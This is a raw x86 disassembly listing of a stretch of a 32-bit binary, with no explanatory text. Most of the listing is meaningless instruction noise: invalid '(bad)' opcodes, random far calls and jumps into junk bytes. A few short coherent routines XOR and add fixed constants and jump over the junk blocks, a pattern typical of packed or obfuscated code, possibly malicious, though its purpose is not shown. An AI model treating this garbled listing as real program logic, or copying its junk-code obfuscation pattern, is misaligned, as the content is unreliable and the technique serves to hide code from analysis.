  4109f2:	lods   eax,DWORD PTR ds:[esi]
  4109f3:	mov    WORD PTR [edx],ds
  4109f5:	sbb    bh,dl
  4109f7:	sbb    esp,esi
  4109f9:	push   cs
  4109fa:	das    
  4109fb:	call   0x1c32:0xd5f1bece
  410a02:	inc    esi
  410a03:	clc    
  410a04:	mov    ebx,0x9fccf618
  410a09:	test   eax,0x78182b44
  410a0e:	jnp    0x410a58
  410a10:	push   0x63
  410a12:	push   edi
  410a13:	mov    ds:0x979e3655,eax
  410a18:	or     al,dl
  410a1a:	dec    esp
  410a1b:	lock (bad) 
  410a1d:	xlat   BYTE PTR ds:[ebx]
  410a1e:	mov    dl,0x2d
  410a20:	gs loope 0x410a69
  410a23:	jp     0x410a91
  410a25:	loopne 0x410a65
  410a27:	pop    ds
  410a28:	xchg   ebx,eax
  410a29:	ss inc esp
  410a2b:	pop    ss
  410a2c:	std    
  410a2d:	xchg   esp,eax
  410a2e:	fcomp  QWORD PTR [ecx+0xca2d969]
  410a34:	xor    al,0x5c
  410a36:	pushf  
  410a37:	jmp    0x410a08
  410a39:	mov    edi,0x42c34e72
  410a3e:	add    DWORD PTR [eax+0x51daaa77],ebx
  410a44:	mov    esi,0xd7ff7cec
  410a49:	repnz push ds
  410a4b:	push   0xffffffb7
  410a4d:	push   ebx
  410a4e:	(bad)  
  410a4f:	sti    
  410a50:	sub    BYTE PTR [edx-0x45592ab],0x3f
  410a57:	rol    DWORD PTR [edx+0x1ea73a67],1
  410a5d:	aad    0x13
  410a5f:	fidiv  DWORD PTR [ebx]
  410a61:	sti    
  410a62:	push   es
  410a63:	popf   
  410a64:	pushf  
  410a65:	fiadd  WORD PTR [edx]
  410a67:	sbb    BYTE PTR [eax],0xd6
  410a6a:	sbb    eax,0xb8c80b7b
  410a6f:	aam    0xd0
  410a71:	ins    DWORD PTR es:[edi],dx
  410a72:	jne    0x410a9a
  410a74:	jns    0x410a40
  410a76:	clc    
  410a77:	lea    ecx,[edi-0x6fbfeb6d]
  410a7d:	ret    
  410a7e:	mov    DWORD PTR [esi+0x4b1506b3],ebp
  410a84:	cmp    BYTE PTR [ebx+0x30],bh
  410a87:	or     BYTE PTR [ebx-0x3be4e84c],dh
  410a8d:	loope  0x410aab
  410a8f:	je     0x410a7d
  410a91:	scas   eax,DWORD PTR es:[edi]
  410a92:	pop    ecx
  410a93:	cld    
  410a94:	mov    esi,0x4272c57
  410a99:	test   dh,al
  410a9b:	push   ds
  410a9c:	jmp    0x12a1a4
  410aa1:	(bad)  
  410aa2:	mov    bh,0x15
  410aa4:	add    dl,BYTE PTR [eax+0x52]
  410aa7:	in     al,0x3
  410aa9:	cld    
  410aaa:	or     DWORD PTR [ecx+0x7a],edx
  410aad:	xor    BYTE PTR [edi+0x5c],bl
  410ab0:	xchg   ebp,eax
  410ab1:	add    al,0xa3
  410ab3:	les    edi,FWORD PTR [eax-0x7f]
  410ab6:	adc    BYTE PTR [ebp+0x19c82e2d],0x2c
  410abd:	mov    bl,0xa1
  410abf:	cld    
  410ac0:	test   BYTE PTR [ebx-0x26],al
  410ac3:	xchg   esi,eax
  410ac4:	mov    ch,0x57
  410ac6:	dec    edx
  410ac7:	lock gs xchg ecx,eax
  410aca:	adc    BYTE PTR ss:[edi],cl
  410acd:	enter  0xfed3,0x63
  410ad1:	sub    BYTE PTR [eax+0x64c71d68],ch
  410ad7:	and    BYTE PTR [edx+0x3275c903],dh
  410add:	repz call 0x759d53f8
  410ae3:	rcr    ah,0xa
  410ae6:	lods   al,BYTE PTR ds:[esi]
  410ae7:	sbb    BYTE PTR [esi+0x5fa76d6f],bl
  410aed:	cmp    ebx,0x368db099
  410af3:	or     edi,DWORD PTR [ebx]
  410af5:	push   cs
  410af6:	inc    ecx
  410af7:	jno    0x410ac5
  410af9:	stos   BYTE PTR es:[edi],al
  410afa:	sub    al,0x13
  410afc:	xchg   edx,eax
  410afd:	and    DWORD PTR [ebp+0x7b2fd02],edi
  410b03:	aaa    
  410b04:	out    0xf0,eax
  410b06:	dec    esp
  410b07:	xchg   edx,eax
  410b08:	dec    edi
  410b09:	(bad)  
  410b0a:	rcl    DWORD PTR [ebx],1
  410b0c:	dec    ecx
  410b0d:	clc    
  410b0e:	sahf   
  410b0f:	xchg   ecx,eax
  410b10:	mov    dl,0xee
  410b12:	mov    edx,0xe4f05185
  410b17:	neg    DWORD PTR [edx]
  410b19:	push   ebp
  410b1a:	dec    edx
  410b1b:	push   edx
  410b1c:	mov    esi,0xfb5e7120
  410b21:	inc    ebx
  410b22:	push   0xd76c8332
  410b27:	dec    ebx
  410b28:	das    
  410b29:	xchg   ebp,eax
  410b2a:	pop    es
  410b2b:	add    al,bh
  410b2d:	mov    DWORD PTR [ebx-0x79816682],edi
  410b33:	fcom   QWORD PTR [edx-0x24]
  410b36:	lods   eax,DWORD PTR ds:[esi]
  410b37:	fsub   DWORD PTR [ebx+0x14]
  410b3a:	aaa    
  410b3b:	jae    0x410afe
  410b3d:	jge    0x410ad3
  410b3f:	mov    WORD PTR [edx+0x61],fs
  410b42:	inc    esp
  410b43:	(bad)  
  410b45:	outs   dx,DWORD PTR ds:[esi]
  410b46:	pop    ebp
  410b47:	push   ebx
  410b48:	sbb    DWORD PTR [ebx-0x7f],esi
  410b4b:	jne    0x410b3e
  410b4d:	(bad)  
  410b4e:	adc    edx,DWORD PTR [esi-0x40b03b0b]
  410b54:	hlt    
  410b55:	fs popf 
  410b57:	scas   al,BYTE PTR es:[edi]
  410b58:	xchg   edi,esi
  410b5a:	add    ah,BYTE PTR [ecx]
  410b5c:	in     eax,dx
  410b5d:	outs   dx,BYTE PTR ds:[esi]
  410b5e:	adc    DWORD PTR [ebx],edi
  410b60:	cmp    bh,BYTE PTR [ecx]
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz jl 0x410c22
  410ba6:	dec    ebp
  410ba7:	out    0x3e,al
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bc2
  410bb1:	mov    ah,0x31
  410bb3:	jae    0x410bf0
  410bb5:	popf   
  410bb6:	rol    DWORD PTR [ebp-0x400277d5],1
  410bbc:	int    0x20
  410bbe:	pop    es
  410bbf:	or     eax,0x4180643a
  410bc4:	out    0xd,al
  410bc6:	or     DWORD PTR [esi+0x39634e8e],eax
  410bcc:	leave  
  410bcd:	fsubr  DWORD PTR [edx]
  410bcf:	add    DWORD PTR [esi+0x5ca3a3db],eax
  410bd5:	xor    DWORD PTR [ecx+eax*8],esi
  410bd8:	int    0x12
  410bda:	stos   BYTE PTR es:[edi],al
  410bdb:	mov    ecx,ebp
  410bdd:	iret   
  410bde:	xchg   edx,eax
  410bdf:	inc    eax
  410be0:	sbb    cl,BYTE PTR [ecx+0x28395067]
  410be6:	outs   dx,DWORD PTR ds:[esi]
  410be7:	mov    ch,0x5f
  410be9:	inc    ecx
  410bea:	fdivr  QWORD PTR [esi+ebp*1]
  410bed:	js     0x410bec
  410bef:	dec    esi
  410bf0:	inc    ecx
  410bf1:	lods   eax,DWORD PTR ds:[esi]
  410bf2:	mov    esi,0x95e240d9
  410bf7:	mov    eax,ds:0xa975ceda
  410bfc:	in     al,dx
  410bfd:	sbb    cl,BYTE PTR [edx]
  410bff:	jmp    0xb1421325
  410c04:	and    ah,BYTE PTR [esi]
  410c06:	mov    ah,0x44
  410c08:	jns    0x410b8d
  410c0a:	mov    ecx,0x9562948e
  410c0f:	mov    edi,0xcddead19
  410c14:	mov    edi,0x6b5a2b7e
  410c19:	mov    esp,0x99184e84
  410c1e:	xchg   ebp,eax
  410c1f:	sub    dh,BYTE PTR [edx]
  410c21:	mov    esp,0xb52c6346
  410c26:	sbb    ecx,edi
  410c28:	mov    eax,0x2983472e
  410c2d:	sbb    DWORD PTR [eax],esi
  410c2f:	sub    eax,0xf28bac83
  410c34:	xchg   DWORD PTR [ecx],esp
  410c36:	mov    ecx,0xb39307e1
  410c3b:	fistp  DWORD PTR gs:[esi+0x5e50c049]
  410c42:	mov    ss,WORD PTR [esi-0x4c]
  410c45:	jmp    0x7e8b:0x99bb5750
  410c4c:	sahf   
  410c4d:	cmp    eax,0x3f31ccd3
  410c52:	adc    eax,0x907a4f62
  410c57:	mov    dh,0x90
  410c59:	das    
  410c5a:	jmp    0x410bff
  410c5c:	call   0xa424:0x4c652af2
  410c63:	adc    esi,DWORD PTR [esi]
  410c65:	js     0x410cda
  410c67:	xor    edx,edi
  410c69:	mov    bh,0x2b
  410c6b:	ret    
  410c6c:	pop    ebp
  410c6d:	mov    bh,0x78
  410c6f:	mov    eax,0xd9d514ae
  410c74:	mov    ecx,0x3a83261a
  410c79:	or     ch,dh
  410c7b:	mov    al,0x6
  410c7d:	lea    edx,[ebx+0x65]
  410c80:	(bad)  
  410c81:	lds    esp,FWORD PTR [ebx+0x48e5e6ee]
  410c87:	out    0xdd,eax
  410c89:	inc    esp
  410c8a:	pop    edi
  410c8b:	not    ebp
  410c8d:	cmp    DWORD PTR [eax-0x7dda8a9a],ecx
  410c93:	push   ds
  410c94:	mov    ebp,0xed3d885a
  410c99:	cld    
  410c9a:	(bad)  
  410c9b:	mov    dl,0x45
  410c9d:	ja     0x410c24
  410c9f:	arpl   dx,di
  410ca1:	es dec ebx
  410ca3:	push   ecx
  410ca4:	and    BYTE PTR [esp+esi*1],cl
  410ca7:	adc    ebx,DWORD PTR [eax+ebx*4]
  410caa:	pushf  
  410cab:	(bad)  
  410cac:	das    
  410cad:	mov    al,0xb
  410caf:	mov    ah,0x6e
  410cb1:	xchg   esp,eax
  410cb2:	xor    eax,0x379a3c43
  410cb7:	fadd   st(0),st
  410cb9:	and    ebx,esp
  410cbb:	stos   DWORD PTR es:[edi],eax
  410cbc:	or     BYTE PTR [esi],0xb1
  410cbf:	mov    ch,0xa1
  410cc1:	sbb    al,0xfc
  410cc3:	das    
  410cc4:	xchg   DWORD PTR [edi-0x2c],edx
  410cc7:	pusha  
  410cc8:	retf   0x3d4c
  410ccb:	xchg   ebx,eax
  410ccc:	fdivr  DWORD PTR [ecx-0x41]
  410ccf:	adc    eax,0x66a34a07
  410cd4:	mov    dh,0x4a
  410cd6:	dec    ebx
  410cd7:	dec    eax
  410cd8:	xchg   DWORD PTR [ecx-0x5d],eax
  410cdb:	mov    BYTE PTR [eax+edx*4+0xd],0xe0
  410ce0:	mov    al,ds:0x898adf88
  410ce5:	add    al,0xbc
  410ce7:	pusha  
  410ce8:	jl     0x410d0d
  410cea:	dec    esi
  410ceb:	xor    al,0xac
  410ced:	add    al,0xc8
  410cef:	xchg   ebx,eax
  410cf0:	mov    cl,0xfc
  410cf2:	push   edx
  410cf3:	out    0xa8,eax
  410cf5:	jp     0x410d3c
  410cf7:	aad    0xcb
  410cf9:	dec    ecx
  410cfa:	pop    edx
  410cfb:	inc    ebx
  410cfc:	fst    DWORD PTR [esi-0x18ff919f]
  410d02:	std    
  410d03:	stos   BYTE PTR es:[edi],al
  410d04:	xchg   esi,eax
  410d05:	clc    
  410d06:	hlt    
  410d07:	adc    ah,dl
  410d09:	and    BYTE PTR [ebp+0x2],al
  410d0c:	fcmove st,st(3)
  410d0e:	lods   eax,DWORD PTR ds:[esi]
  410d0f:	and    bh,BYTE PTR [ecx-0x1ac0a74f]
  410d15:	mov    bh,0xba
  410d17:	aaa    
  410d18:	gs push ebp
  410d1a:	mov    ebx,0xaad3f877
  410d1f:	stos   BYTE PTR es:[edi],al
  410d20:	jnp    0x410d31
  410d22:	js     0x410d59
  410d24:	mov    edx,0xa75aebfe
  410d29:	aad    0x2f
  410d2b:	dec    edx
  410d2c:	nop
  410d2d:	pop    edi
  410d2e:	mov    ds:0x4e74067,eax
  410d33:	mov    ebp,0x5d513cbb
  410d38:	mov    ds:0xa4af1cf8,al
  410d3d:	sbb    al,0x82
  410d3f:	call   0xfe80:0x80aa184e
  410d46:	mov    ecx,0x9cf07e4f
  410d4b:	iret   
  410d4c:	push   esp
  410d4d:	xchg   ecx,eax
  410d4e:	sahf   
  410d4f:	add    eax,0xd41e5607
  410d54:	dec    ebp
  410d55:	mov    edx,0x4c5dd12a
  410d5a:	ss pop ebp
  410d5c:	mov    WORD PTR [ecx-0x187839c0],cs
  410d62:	sub    eax,DWORD PTR [edi+0x1ad3eb0e]
  410d68:	inc    ecx
  410d69:	and    esp,DWORD PTR [eax-0x67]
  410d6c:	or     BYTE PTR [edx],ah
  410d6e:	inc    ebx
  410d6f:	das    
  410d70:	and    BYTE PTR cs:[ebx],al
  410d73:	mov    ebp,0x1ae86aec
  410d78:	jbe    0x410d4d
  410d7a:	loopne 0x410d40
  410d7c:	jge    0x410db4
  410d7e:	(bad)  
  410d7f:	and    al,0xb7
  410d81:	mov    BYTE PTR [ebx],bl
  410d83:	mov    cl,0x47
  410d85:	into   
  410d86:	dec    edi
  410d87:	sbb    edx,DWORD PTR [edi]
  410d89:	jnp    0x410d83
  410d8b:	xor    DWORD PTR [ebx+edi*4-0x26f73060],edx
  410d92:	aad    0x8d
  410d94:	jl     0x410d44
  410d96:	xchg   edi,eax
  410d97:	inc    ebp
  410d98:	aam    0x9a
  410d9a:	sbb    al,0x57
  410d9c:	pop    eax
  410d9d:	pop    ds
  410d9e:	push   ebx
  410d9f:	repnz sub edx,esp
  410da2:	gs xchg ecx,eax
  410da4:	gs add eax,0xe6df56fe
  410daa:	(bad)  
  410dac:	pop    edx
  410dad:	pop    eax
  410dae:	mov    bh,0x8c
  410db0:	inc    ebp
  410db1:	enter  0xf500,0x1d
  410db5:	outs   dx,DWORD PTR ds:[esi]
  410db6:	pop    ds
  410db7:	les    ecx,FWORD PTR [ecx+0x4b8954b6]
  410dbd:	sbb    BYTE PTR ss:[edx-0x19],bh
  410dc1:	pop    ds
  410dc2:	adc    eax,0x690c5063
  410dc7:	test   bh,dh
  410dc9:	push   ss
  410dca:	pushf  
  410dcb:	adc    BYTE PTR [ecx-0x4e],dh
  410dce:	fldenv [ecx]
  410dd0:	aaa    
  410dd1:	xor    BYTE PTR [ebp+ebp*8+0x3b3e1783],dh
  410dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dd9:	jne    0x410d7d
  410ddb:	adc    ch,ah
  410ddd:	jo     0x410dfa
  410ddf:	adc    eax,0x3b4995a8
  410de4:	test   al,0x33
  410de6:	add    ah,BYTE PTR [edi]
  410de8:	push   esi
  410de9:	inc    ecx
  410dea:	push   ebx
  410deb:	jnp    0x410d86
  410ded:	jle    0x410dc0
  410def:	pop    esi
  410df0:	jne    0x410d88
  410df2:	rol    DWORD PTR cs:[edi-0x80],0xf3
  410df7:	call   0xba653821
  410dfc:	gs call 0xe69932d0
  410e02:	inc    esp
  410e03:	xchg   ebx,eax
  410e04:	push   edi
  410e05:	ror    DWORD PTR [ecx],0xc1
  410e08:	xor    al,0xc3
  410e0a:	or     ebp,DWORD PTR [edx]
  410e0c:	pushf  
  410e0d:	(bad)  
  410e0e:	jle    0x410dd3
  410e10:	cs add dh,ah
  410e13:	mov    edi,0xddc5b1df
  410e19:	dec    esi
  410e1a:	mov    es,WORD PTR [edi+0x9]
  410e1d:	cwde   
  410e1e:	mov    eax,ds:0x7209037a
  410e23:	dec    esp
  410e24:	imul   ecx,DWORD PTR [esi-0x45],0x481a3716
  410e2b:	jmp    0x6edfdd93
  410e30:	xor    eax,DWORD PTR [ecx-0xb80ad72]
  410e36:	jp     0x410e1c
  410e38:	add    BYTE PTR [eax+0x4684f00d],al
  410e3e:	cmp    DWORD PTR gs:[ebp-0x395543a3],eax
  410e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e46:	xor    esi,DWORD PTR [ebx-0xf68fd8f]
  410e4c:	sub    al,0x1f
  410e4e:	ret    
  410e4f:	pusha  
  410e50:	or     BYTE PTR [edi+0x36623256],dh
  410e56:	xor    al,0x97
  410e58:	lds    eax,FWORD PTR [edx+0x49122792]
  410e5e:	mov    esi,0x228fbca8
  410e63:	sar    DWORD PTR [edi*4+0x4caa65c1],0xe3
  410e6b:	xor    BYTE PTR [ecx+0x29],dl
  410e6e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e70:	(bad)  
  410e73:	sub    DWORD PTR [edx],esp
  410e75:	sub    BYTE PTR [ecx-0x1a],bl
  410e78:	add    eax,0x267dbe
  410e7d:	idiv   BYTE PTR [bp+si]
  410e80:	dec    ebp
  410e81:	and    al,0x66
  410e83:	cdq    
  410e84:	(bad)  
  410e85:	jecxz  0x410eab
  410e87:	xor    DWORD PTR [ecx+0x5d],esi
  410e8a:	dec    esp
  410e8b:	js     0x410e82
  410e8d:	repnz inc BYTE PTR [ebx]
  410e90:	mov    eax,0x3771aaf7
  410e95:	loop   0x410efa
  410e97:	inc    edx
  410e98:	popf   
  410e99:	push   ebp
  410e9a:	mov    ah,0x6d
  410e9c:	or     eax,0xe73541f1
  410ea1:	gs and eax,0x5f657b18
  410ea7:	outs   dx,DWORD PTR ds:[esi]
  410ea8:	leave  
  410ea9:	dec    ecx
  410eaa:	cmp    al,0x74
  410eac:	aaa    
  410ead:	gs (bad) 
  410eaf:	out    0xa2,al
  410eb1:	pop    eax
  410eb2:	cli    
  410eb3:	cli    
  410eb4:	ins    DWORD PTR es:[edi],dx
  410eb5:	in     al,0xbf
  410eb7:	add    al,0xcd
  410eb9:	mov    ds:0x32e1a45b,al
  410ebe:	mov    cl,0x63
  410ec0:	cdq    
  410ec1:	pop    ecx
  410ec2:	jmp    0x410e52
  410ec4:	mov    ah,0x59
  410ec6:	mov    DWORD PTR [esp+eax*2+0xeeec0d],edx
  410ecd:	loop   0x410f22
  410ecf:	push   ebx
  410ed0:	leave  
  410ed1:	dec    edx
  410ed2:	mov    al,bh
  410ed4:	push   eax
  410ed5:	push   0x27bcb797
  410eda:	aas    
  410edb:	mov    DWORD PTR [ebx+0x717d8bfe],edi
  410ee1:	dec    edi
  410ee2:	pop    edx
  410ee3:	jl     0x410f31
  410ee5:	jmp    0x410ed3
  410ee7:	out    0x34,eax
  410ee9:	lock dec edi
  410eeb:	add    BYTE PTR [edx+0x477c619f],dl
  410ef1:	xchg   BYTE PTR [edi-0x7a22875e],dh
  410ef7:	jl     0x410f22
  410ef9:	mov    ebx,ss
  410efb:	rcr    BYTE PTR [edi+0x19],0xdd
  410eff:	lds    edx,FWORD PTR [edx]
  410f01:	dec    esi
  410f02:	sbb    eax,0xa09e8d49
  410f07:	fimul  WORD PTR [eax]
  410f09:	and    DWORD PTR [edi],0xf09e7d19
  410f0f:	jbe    0x410ec9
  410f11:	mov    ebx,0x9e69afde
  410f16:	mov    esp,0xdda14a7b
  410f1b:	popf   
  410f1c:	sbb    ch,ah
  410f1e:	(bad)  
  410f20:	mov    ds:0xf73453f2,al
  410f26:	gs dec edi
  410f28:	push   eax
  410f29:	mov    al,ds:0xe71d0d94
  410f2e:	ror    DWORD PTR [ecx+ebp*8+0x2fcda9cf],0x38
  410f36:	cmp    bh,ch
  410f38:	outs   dx,DWORD PTR ds:[esi]
  410f39:	jae    0x410ecc
  410f3b:	xor    dl,BYTE PTR [ecx]
  410f3d:	in     al,0x11
  410f3f:	sahf   
  410f40:	cld    
  410f41:	ret    0x7878
  410f44:	xchg   esi,eax
  410f45:	or     BYTE PTR [edx+0x5a],0x2e
  410f49:	mov    edx,0x296094f2
  410f4e:	sub    BYTE PTR [edi+eiz*8-0x4f],al
  410f52:	mov    bl,0x7c
  410f54:	push   esi
  410f55:	mov    eax,0xfe07d87e
  410f5a:	pushf  
  410f5b:	inc    ebp
  410f5c:	fistp  DWORD PTR [ebp-0x1d27d17d]
  410f62:	jne    0x410faf
  410f64:	sbb    BYTE PTR [eax+eax*4],cl
  410f67:	lods   al,BYTE PTR ds:[esi]
  410f68:	mov    bl,0x45
  410f6a:	push   0x68
  410f6c:	out    dx,eax
  410f6d:	mov    al,0x5e
  410f6f:	js     0x410f3a
  410f71:	pop    ss
  410f72:	mov    ebx,ecx
  410f74:	mov    edx,DWORD PTR [eax]
  410f76:	pusha  
  410f77:	jecxz  0x410fe0
  410f79:	(bad)  
  410f7a:	or     edx,esi
  410f7c:	fidiv  DWORD PTR [edi+0x59]
  410f7f:	(bad)  
  410f80:	out    0x9e,eax
  410f82:	pop    esp
  410f83:	mov    al,ds:0xfae7043b
  410f88:	add    al,0x5
  410f8a:	mov    esp,0xca5e85db
  410f8f:	jno    0x41100b
  410f91:	push   0x62e17dd9
  410f96:	add    al,0x24
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fdee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e19c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x1d50ad4]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f80
  410fdd:	into   
  410fde:	push   ds
  410fdf:	jge    0x410f9b
  410fe1:	jp     0x410f7b
  410fe3:	mov    eax,ds:0xe32289fe
  410fe8:	mov    ah,0x3f
  410fea:	std    
  410feb:	test   ebx,edx
  410fed:	or     bl,BYTE PTR [esi+0x4d508f5a]
  410ff3:	mov    eax,ds:0xa0e75bf4
  410ff8:	mov    dh,0x3f
  410ffa:	addr16 test esp,esp
  410ffd:	adc    DWORD PTR [esi+0x6582c867],0xfffffff6
  411004:	and    DWORD PTR [edx-0x32],0x10c86946
  41100b:	ret    
  41100c:	jno    0x410fe2
  41100e:	gs cld 
  411010:	arpl   WORD PTR [edx-0x76],bp
  411013:	in     eax,0xa6
  411015:	or     ecx,edi
  411017:	lea    edx,[edi*2+0x34251ea1]
  41101e:	out    dx,al
  41101f:	dec    ebx
  411020:	sbb    bh,BYTE PTR [edi]
  411022:	fcomp  DWORD PTR [edi]
  411024:	jmp    0x69eb:0x3487e983
  41102b:	daa    
  41102c:	pop    eax
  41102d:	test   al,0xb7
  41102f:	outs   dx,BYTE PTR ds:[esi]
  411030:	leave  
  411031:	cs ins BYTE PTR es:[edi],dx
  411033:	adc    DWORD PTR [ecx],esi
  411035:	xor    ch,BYTE PTR [ebx+0x69510721]
  41103b:	xchg   edx,eax
  41103c:	into   
  41103d:	cmp    ecx,DWORD PTR [eax+0x38]
  411040:	sub    al,0x5e
  411042:	cs stos BYTE PTR es:[edi],al
  411044:	and    BYTE PTR [ebp+0x10],0x88
  411048:	stc    
  411049:	mov    eax,ds:0x8659a5eb
  41104e:	ins    DWORD PTR es:[edi],dx
  41104f:	mov    bl,0x39
  411051:	sbb    esi,DWORD PTR [ebp-0x16acab5d]
  411057:	test   eax,0x5cf5e55
  41105c:	sbb    bl,al
  41105e:	dec    edi
  41105f:	pop    ebp
  411060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411061:	pop    ebp
  411062:	imul   DWORD PTR [edx+ebp*4+0x1d2533d2]
  411069:	push   ds
  41106a:	cwde   
  41106b:	jne    0x41105f
  41106d:	repz mov ah,0x1
  411070:	xor    BYTE PTR [esi],0x78
  411073:	jno    0x411070
  411075:	cld    
  411076:	rol    ecx,0x50
  411079:	pop    ecx
  41107a:	or     BYTE PTR [edx],al
  41107c:	jb     0x4110d3
  41107e:	sub    eax,0x8eeb00ec
  411083:	scas   eax,DWORD PTR es:[edi]
  411084:	pop    ecx
  411085:	sub    al,0x38
  411087:	push   ebx
  411088:	mov    dh,0x19
  41108a:	pop    ss
  41108b:	jo     0x4110aa
  41108d:	shl    BYTE PTR [edx],1
  41108f:	(bad)  
  411090:	lds    edi,FWORD PTR [ebp-0x32a809b9]
  411096:	cdq    
  411097:	and    eax,DWORD PTR [ecx]
  411099:	mov    ah,0xf5
  41109b:	adc    al,0xab
  41109d:	cli    
  41109e:	(bad)  
  41109f:	mov    dl,0x25
  4110a1:	int    0x38
  4110a3:	jb     0x4110bf
  4110a5:	or     bl,BYTE PTR [ecx+0x534a8b8d]
  4110ab:	adc    edx,DWORD PTR [esi]
  4110ad:	jne    0x41112a
  4110af:	fsub   QWORD PTR [edi+0x5b77d2bc]
  4110b5:	cvtpi2ps xmm3,QWORD PTR [esi-0x1b]
  4110b9:	mov    WORD PTR [esi],cs
  4110bb:	jmp    0x41106d
  4110bd:	dec    esi
  4110be:	cld    
  4110bf:	out    0x2c,eax
  4110c1:	push   cs
  4110c2:	and    ebx,DWORD PTR [ebx-0x6057bb70]
  4110c8:	cmp    eax,ecx
  4110ca:	sbb    al,0x56
  4110cc:	gs inc eax
  4110ce:	lea    ecx,[edi-0x484c399a]
  4110d4:	jno    0x411056
  4110d6:	push   esp
  4110d7:	scas   eax,DWORD PTR es:[edi]
  4110d8:	sahf   
  4110d9:	mov    BYTE PTR [esi],al
  4110db:	in     al,dx
  4110dc:	(bad)  
  4110dd:	xor    edx,DWORD PTR [ecx+0x7c]
  4110e0:	fstp   st(7)
  4110e2:	mov    ah,0x9
  4110e4:	lock sub BYTE PTR [edi],bl
  4110e7:	adc    edi,ebx
  4110e9:	sub    al,0x4e
  4110eb:	jmp    0xf411:0x252c07d2
  4110f2:	outs   dx,BYTE PTR ds:[esi]
  4110f3:	push   ecx
  4110f4:	inc    edi
  4110f5:	nop
  4110f6:	cwde   
  4110f7:	push   edi
  4110f8:	jmp    0xac96:0xc87893d
  4110ff:	(bad)  [ecx-0x7d588a7b]
  411105:	and    ebp,eax
  411107:	hlt    
  411108:	sub    eax,0xeea7f31e
  41110d:	dec    ebp
  41110e:	fiadd  WORD PTR [eax-0x28]
  411111:	push   edi
  411112:	out    dx,eax
  411113:	or     eax,0x58a74192
  411118:	add    bl,BYTE PTR [ebx+ebp*1+0x4c]
  41111c:	or     al,0x2d
  41111e:	xor    BYTE PTR [ebp-0x6d],ch
  411121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411122:	mov    ebx,0xa2a977d9
  411127:	mov    al,ds:0xf9b281a8
  41112c:	call   0xbba8:0x599d7089
  411133:	inc    ecx
  411134:	sbb    esp,DWORD PTR [eax]
  411136:	jge    0x4111b7
  411138:	cmc    
  411139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41113a:	(bad)  [ebx]
  41113c:	xchg   esi,eax
  41113d:	jo     0x4110f9
  41113f:	xor    ecx,edx
  411141:	mov    al,ds:0x45dd457c
  411146:	add    DWORD PTR [esi+0x777deb75],0xe9af3865
  411150:	(bad)  
  411151:	inc    ecx
  411152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411153:	pushf  
  411154:	cmp    eax,0x951c2007
  411159:	mov    ds:0xebe02ffe,eax
  41115e:	mov    cl,al
  411160:	or     BYTE PTR [ebx],ah
  411162:	(bad)  
  411163:	fsubr  DWORD PTR [edx+0x22]
  411166:	icebp  
  411167:	inc    ebx
  411168:	jb     0x4110fb
  41116a:	cmc    
  41116b:	add    BYTE PTR [edx+eiz*1+0x33],dl
  41116f:	es dec edi
  411171:	test   eax,0x9d15ada0
  411176:	cmp    al,0xf0
  411178:	test   al,0xcc
  41117a:	push   0xffffff88
  41117c:	dec    ebp
  41117d:	test   eax,0xe0f5eb37
  411182:	div    DWORD PTR [ecx-0x8]
  411185:	ins    DWORD PTR es:[edi],dx
  411186:	add    ah,al
  411188:	and    BYTE PTR [edi-0x4e],bh
  41118b:	mov    eax,ds:0xdaa7432d
  411190:	retf   0xa59f
  411193:	fwait
  411194:	xlat   BYTE PTR ds:[ebx]
  411195:	adc    al,0x37
  411197:	mov    al,0xfe
  411199:	lods   al,BYTE PTR ds:[esi]
  41119a:	pusha  
  41119b:	fnstsw WORD PTR [eax]
  41119d:	or     BYTE PTR [edx+0x67],0xca
  4111a1:	jl     0x411126
  4111a3:	retf   0xeffb
  4111a6:	mov    bh,0x63
  4111a8:	jnp    0x4111d1
  4111aa:	test   ch,bl
  4111ac:	stos   DWORD PTR es:[edi],eax
  4111ad:	gs mov ah,0x31
  4111b0:	cmp    cl,BYTE PTR [edi-0x5dbea421]
  4111b6:	mov    DWORD PTR [ebx+edx*8],edx
  4111b9:	dec    ecx
  4111ba:	retf   
  4111bb:	inc    edi
  4111bc:	clc    
  4111bd:	xchg   esp,eax
  4111be:	and    DWORD PTR [ebp+0x52],edi
  4111c1:	hlt    
  4111c2:	xor    BYTE PTR [edi+0x57c544dc],al
  4111c8:	fnstenv [esi+0x5e88a8a9]
  4111ce:	ficomp WORD PTR [edx+0x2]
  4111d1:	and    eax,DWORD PTR [ebx]
  4111d3:	cmc    
  4111d4:	and    BYTE PTR [edi+0x3a],ah
